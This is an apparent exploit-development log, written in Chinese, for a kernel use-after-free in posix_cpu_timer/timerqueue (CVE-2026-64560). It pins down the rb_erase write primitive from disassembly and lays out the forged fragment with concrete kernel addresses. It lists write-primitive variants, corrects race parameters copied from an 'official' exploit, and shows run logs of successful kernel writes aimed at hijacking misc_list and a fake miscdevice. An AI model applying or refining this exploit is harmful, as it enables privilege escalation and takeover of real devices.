# H12 轮分析：rb_erase 真实写序定案 + 官方 dada 参数回滚

> 2026-10-05 · 承接 H11 轮（ENOTTY 语义定案）
> 证据：`Image-mey` 反汇编（capstone 5.0.7）+ `analysis/output/disasm_walk.txt` + 官方 `exploit-rotate.c`

---

## 1 根因定类（用户阶段二要求）

**`rb_erase` 写原语的根因类别 = 竞争（UAF 的删除侧）**，具体形态：

```
timerqueue_del(head, node)          // node = 被 UAF 的 posix_cpu_timer 的 timerqueue_node
  └─ rb_erase(node, root)           // root = &head->rb_root
       写原语在 【0x3aa00】 与 【0x3aa10】 两条 str
```

- **UAF 本体**：`posix_cpu_timer` 在 victim 进程退出时被 `cleanup_timerqueue` 释放，但 **fragment（order-1 page）抢在 free 之后被 spray 进同一 slab 槽** ⇒ 内核把 fragment 当作合法 `timerqueue_node` 使用。
- **不是类型混淆**（fragment 被有意构造成 `timerqueue_node` 布局）
- **不是越界**（写地址由 fragment 内的 `rb_parent_color` 字段**直接指定**，是"数据驱动的任意写"）

**⇒ 定类：竞争 + UAF（use-after-free of timerqueue_node），写原语 = rb_erase 的摘链写。**

---

## 2 ★★★ 写序定案（推翻旧结论）

### 2.1 关键：`timerqueue_del` 传给 `rb_erase` 的 x0 是 node 本身

```
timerqueue_del @ 0x3f7d8:
  0x3f814: mov x0, x19        ; x19 = x1 入参 = node (timerqueue_node*)
  0x3f818: mov x1, x20        ; x20 = x0 入参 = head/tree_root
  0x3f81c: bl  0x3a9d4        ; rb_erase(node, root)
```

30 处调用点全部形态一致：`add x0, X, #0x20`（head 在 +0x20）+ `mov x1, Y`（node）。

### 2.2 几何判定：`x8 = rb_right`、`x10 = rb_left`

```
rb_erase @ 0x3a9d4:
  0x3a9d4: ldp x8, x10, [x0, #8]   ; x8 = [node+8] = node->rb_right
                                   ; x10= [node+0x10] = node->rb_left
  0x3a9d8: cbnz x10, 0x3aa18       ; rb_left != 0 ?
```

对照 Linux 6.6 `lib/rbtree.c`：
```c
child = node->rb_right;   /* → x8  */
tmp   = node->rb_left;    /* → x10 */
if (!tmp) { ... }         /* cbnz x10 → 不跳 = left==0 */
```

**fragment 布局**（`build_fake_fragment` / `build_misc_fragments`，f77 与官方逐字节同构）：
| offset | 字段 | 写入值 |
|---|---|---|
| +0x00 | `rb_parent_color` | `forged_parent` |
| +0x08 | `rb_right` | `forged_child` (**非 0**) |
| +0x10 | `rb_left` | **0**（memset，从未写） |
| +0x18 | `expires` | `UINT64_MAX` |

**⇒ `rb_left == 0`、`rb_right != 0` ⇒ 走 `0x3a9dc` 分支**（`cbnz x10` 不跳）。

### 2.3 ★ 真实写序（两条 str）

```
0x3a9dc: ldr  x9, [x0]              ; x9 = node->rb_parent_color = forged_parent
0x3a9e4: ands x10, x9, #-4          ; parent = forged_parent & ~3
0x3a9e8: b.eq 0x3aa00               ; parent==0 → 用 root
0x3a9f0: ldr  x12, [x11, #0x10]!    ; ★★ 读 *(parent+0x10) —— parent 必须可读！
0x3a9f8: cmp  x12, x0               ; parent->rb_left == node ?
0x3a9fc: csel x11, x11, x13, eq     ; x11 = parent+0x10 (eq) / parent+0x8 (ne)
0x3aa00: str  x8, [x11]             ; ★★★ W1: *(parent+0x10 或 +0x8) = rb_right
0x3aa04: cbnz x8, 0x3aa10           ; rb_right != 0 ?
0x3aa10: str  x9, [x8]              ; ★★ W2: *(rb_right) = forged_parent
0x3aa14: ret                        ; 直接返回，不进 __rb_erase_color
```

**⇒ 写原语 = `W1: *(forged_parent + 8) = forged_child`（取 `parent->rb_left != node` 分支）**

**注意**：`0x3ab0c: str x9, [x10]` 那条（旧资料称为写原语）**属于 `0x3ab04` 子路径，进入条件是 `rb_left != 0 && rb_right == 0`**，与 64560 的 fragment 几何**相反** ⇒ **旧 `RE_rb_erase_mechanism_2026-09-28.md` 的 0x3ab0c 结论是 43499 路线的几何，对 64560 不适用。**

### 2.4 与设计意图/实测三方闭环

| | stage0 | stageB |
|---|---|---|
| `forged_parent` | `P0alias(ctl_table[boot_id])` = `0xffffff802a29b090` | `P0alias(misc_list) - 8` = `0xffffff802a29b188` |
| W1 写目标 | `forged_parent+8` = `ctl_table[boot_id].data` 槽 | `forged_parent+8` = `misc_list.next` 槽 |
| W1 写值 | `forged_child` = `P0alias(cycleC)` | `forged_child` = `fake_misc_child(page.base,0,0)` |
| 效果 | `table->data` 改成 `P0alias(cycleC)` ⇒ `proc_do_uuid` 读到 fragment ⇒ `boot_id[0:8]==forged_parent` | `misc_list.next` 指向假 miscdevice ⇒ `misc_open()` 遍历到假设备 |

**实测 `h10_r2_full.log`**：
```
BOOTID_WRITE_PASS attempt=94 q0=0xffffff802a29b090 q1=0xffffffe34ad7d5d0 slide=0x22c8c00000
FAKE_ORDER1_MULTI parent=0xffffff802a29b188 expires=0xffffffffffffffff ...
```
- `q0 == forged_parent` ⇒ stage0 判据命中 ✓
- `q1` 是 `*(P0alias(cycleC))[8:16]` 的内核残留值（**判据不要求**，不是 forged_child）✓
- stageB `forged_parent = 0xffffff802a29b188` 与 `0xffffff802a29b090 + 0x100 - 8` 精确吻合（`misc_list - ctl[boot_id] = 0x100`）✓

**⇒ 反汇编 = 设计 = 实测，三者自洽。代码无抄错。**

---

## 3 变体矩阵穷举（回答"穷举同类变体"）

| # | (pc, right, left) | 路径 | 写序 | 风险 |
|---|---|---|---|---|
| V1 | EVEN, ≠0, 0 | `0x3a9dc→0x3aa10` | `*(par+8)=right`, `*(right)=pc` | ★ 需 par 可读 |
| V2 | EVEN, 0, 0 | `0x3a9dc→0x3aa0c` | `*(par+8)=0` | 无跨结构写 |
| V3 | ODD, 0, 0 | `0x3aa78` rebalance | — | ★★ 进 `__rb_erase_color`，链式读 |
| V4 | ODD, ≠0, 0 | `0x3a9dc→0x3aa10` | 写 **奇数指针** | ★★★ 后续解引用必崩 |
| V5 | 0, ≠0, 0 | `0x3aa00` 空树 | `*(root)=right` | 不依赖 par |
| V6 | 0, 0, 0 | `0x3aa00` 空树 | `*(root)=0` | 无 |
| V7 | EVEN, 0, ≠0 | `0x3ab04` | `*(0)=pc`（旧 43499 几何） | 后继 walk |
| V8 | EVEN, ≠0, ≠0 | `0x3aa1c` 双子 | 复杂 | ★★ 依赖链可读 |

**⇒ V1（现有几何）是最优**：两处可控写、直接 ret、不进 rebalance。
**⇒ 唯一真实风险 = `0x3a9f0` 读 `*(parent+0x10)`：parent 必须映射。**

---

## 4 ★★★★★ 本轮真正根因：官方 dada 参数被误回滚

### 4.1 铁证：官方 dada 的 setenv 覆写块

`refs/op13-cve-2026-64560/src/exploit-rotate.c`：
```c
/* ── 默认表 exec_environment[] ── */
L5301:  {"IRQ_BATCH_FDS",       "1"}
L5304:  {"EXEC_AFTER_DELETED",  "100"}
L5305:  {"PRIME_START_DELETED", "32"}

/* ── dada 分支专属 setenv 覆写（★ 真正生效）── */
L5425:  if (profile == DADA && setenv("PIPE_COUNT",         "6000",  1))
L5427:  if (profile == DADA && setenv("EXEC_AFTER_DELETED", "54000", 1))   ★★★
L5429:  if (profile == DADA && setenv("IRQ_BATCH_FDS",      "8",     1))   ★★★
```

**⇒ 官方 dada 真实生效值 = `exec_after_deleted 54000` / `irq_batch_fds 8`。**

**官方在该处的注释**：
> `Start exec near the delete tail so a hit has no long rb_erase train.`

### 4.2 H8 轮的错误与本轮回滚

| 参数 | 官方 dada 真值 | H8 轮误改为 | H12 轮回滚为 |
|---|---|---|---|
| `exec_after_deleted` | **54000** | 100 | **54000** ✓ |
| `irq_batch_fds` | **8** | 1 | **8** ✓ |

**H8 的误判原因**：读了 `exec_environment[]` 默认表（L5301/L5304），未读后面的 dada setenv 覆写块（L5427/L5429）。

### 4.3 为什么这条参数直接决定 stageB 成败

- **`exec_after_deleted` 语义**（`victim_exec_thread` L1012-1018）：
  ```c
  int threshold = shared->exec_after_deleted;
  while (shared->deleted < threshold) cpu_relax();
  busy_delay(shared->exec_delay_ns);
  execv(argv[0], argv);
  ```
  ⇒ victim 等 **deleted 计数达到 threshold** 才 `execv`。

- **`exec_after_deleted=100`**：exec 极早（deleted 才 100 就 exec）⇒ 命中时 `rb_erase` 的 **train 很长**（后面还有几万次 timerqueue 操作）⇒ **打错几何的窗口极多 ⇒ 崩**。
- **`exec_after_deleted=54000`**：exec 接近 delete 尾部 ⇒ train 短 ⇒ 打错窗口小 ⇒ 不崩。

**⇒ 这解释了实测崩溃分布**：
| 运行 | `exec_after_deleted` | 结局 |
|---|---|---|
| `h10_r2_full` | 100 | stageB attempt=1 后挂起 |
| `h11_t1` | 100 | 86 att 未崩（被 KILL）|
| `h11_v0_full` | 100 | **97~100 att 后崩** |
| `h11_v1_full` | 100 | **26 att 后崩** |
| **`h12_base`（本轮）** | **54000** | **>92 att 未崩** ✓ |

### 4.4 本轮代码改动（f77.c）

```c
/* H12: 100 -> 54000 */
exec_after_deleted = 54000;
/* H12: 1 -> 8 */
irq_batch_fds = 8;
```

并新增 env 旋钮 `MEY_IRQ_BATCH_FDS`（`MEY_EXEC_AFTER_DELETED` 已存在）。

---

## 5 已排除项（勿重复）

| # | 假设 | 判定 | 证据 |
|---|---|---|---|
| ① | `FAKE_MISC_*` 九常量抄错 | ❌ | 官方 L361-371 vs f77 L386-396 逐字节一致 |
| ② | `minor`/`fops` 未填 | ❌ | `fill_crosscache_payload` 两边同构 |
| ③ | 判据链漏项 | ❌ | `open_verified_bridge`/`validate_misc_bridge` 同构 |
| ④ | `forged_parent` 地址域（physmap vs image） | ⚠️ **理论上无关** | 两域低 32 位相同、写的是同一物理页；stage0 已证 physmap 通道可写；A/B 开关保留 |
| ⑤ | payload 未铺 | ❌ | 见 ② |
| ⑥ | fragment 选择错 | ❌ | spray 线程 `fragment = misc_fragments[(i*REPEATS+repeat)%11]` 同构 |
| ⑦ | 读出通道断 | ❌ | `errno=25` ⇒ 真 uhid fops（H11 定案），即 W1 未生效 |
| ⑧ | 几何选择错（本轮重核） | ❌ | V1 是最优几何，0x3a9dc 路径正确 |

---

## 6 下一轮验证清单

1. **本轮 `h12_base`（54000/8）跑满 512 attempts** —— 观察是否 (a) 不崩 (b) stage0 命中率是否回升至 ~62.5%
2. 若 stage0 命中：观察 stageB 是否出现 `MISC_BRIDGE_MISS_VERIFY ... rc=? image_rc=?`（H11 新日志字段）
3. **`MEY_IRQ_BATCH_FDS` A/B**：8 vs 1 在 54000 下的表现
4. 直接用 `ashmem_fops`（`0xffffffc0812ff898`）替代手工 fake_fops（减一个自由度）
5. C 线：`ro.oba.whenlocked`、`parse_kpatch`、`odm.raw` 扫描、TEE 评定
